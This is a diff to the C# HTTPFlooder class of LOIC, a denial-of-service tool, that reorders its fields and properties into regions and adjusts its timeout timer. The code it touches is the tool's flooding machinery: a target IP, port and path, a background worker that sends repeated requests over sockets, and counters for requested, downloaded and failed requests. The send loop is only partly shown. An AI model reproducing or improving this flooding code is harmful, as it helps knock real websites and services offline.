@@ -2,30 +2,19 @@
 using System.ComponentModel;
 using System.Net;
 using System.Net.Sockets;
+using System.Windows.Forms;
 
 namespace LOIC
 {
 	public class HTTPFlooder
 	{
-		public ReqState State = ReqState.Ready;
-
-		public int Downloaded { get; set; }
-		public int Requested { get; set; }
-		public int Failed { get; set; }
-
-		public bool IsFlooding { get; set; }
-		public string IP { get; set; }
-		public int Port { get; set; }
-		public string Subsite { get; set; }
-		public int Delay { get; set; }
-		public int Timeout { get; set; }
-		public bool Resp { get; set; }
-
+		#region Fields
 		private long LastAction;
 		private Random rnd = new Random();
+		private Timer tTimepoll = new Timer();
+		#endregion
 
-		public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };
-
+		#region Constructors
 		public HTTPFlooder(string ip, int port, string subSite, bool resp, int delay, int timeout)
 		{
 			this.IP = ip;
@@ -35,11 +24,38 @@ namespace LOIC
 			this.Delay = delay;
 			this.Timeout = timeout;
 		}
+		#endregion
+
+		#region Properties
+		public ReqState State = ReqState.Ready;
+
+		public int Downloaded { get; set; }
+
+		public int Requested { get; set; }
+
+		public int Failed { get; set; }
+
+		public bool IsFlooding { get; set; }
+
+		public string IP { get; set; }
+
+		public int Port { get; set; }
+
+		public string Subsite { get; set; }
+
+		public int Delay { get; set; }
+
+		public int Timeout { get; set; }
+
+		public bool Resp { get; set; }
+		#endregion
+
+		#region Methods
 		public void Start()
 		{
 			IsFlooding = true; LastAction = Tick();
 
-			var tTimepoll = new System.Windows.Forms.Timer();
+			tTimepoll = new Timer();
 			tTimepoll.Tick += new EventHandler(tTimepoll_Tick);
 			tTimepoll.Start();
 
@@ -48,14 +64,13 @@ namespace LOIC
 			bw.RunWorkerAsync();
 		}
 
-		void tTimepoll_Tick(object sender, EventArgs e)
+		private static long Tick()
 		{
-			if (Tick() > LastAction + Timeout)
-			{
-				IsFlooding = false; Failed++; State = ReqState.Failed;
-			}
+			return DateTime.Now.Ticks / 10000;
 		}
+		#endregion
 
+		#region Event handlers
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
 			try
@@ -76,6 +91,7 @@ namespace LOIC
 					State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
 					if (Resp) socket.Receive(recvBuf, 64, SocketFlags.None);
 					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
+					tTimepoll.Stop();
 					if (Delay > 0) System.Threading.Thread.Sleep(Delay);
 				}
 			}
@@ -83,9 +99,15 @@ namespace LOIC
 			finally { IsFlooding = false; }
 		}
 
-		private static long Tick()
+		private void tTimepoll_Tick(object sender, EventArgs e)
 		{
-			return DateTime.Now.Ticks / 10000;
+			if (Tick() > LastAction + Timeout)
+			{
+				this.IsFlooding = false;
+				this.Failed++;
+				this.State = ReqState.Failed;
+			}
 		}
+		#endregion
 	}
 }
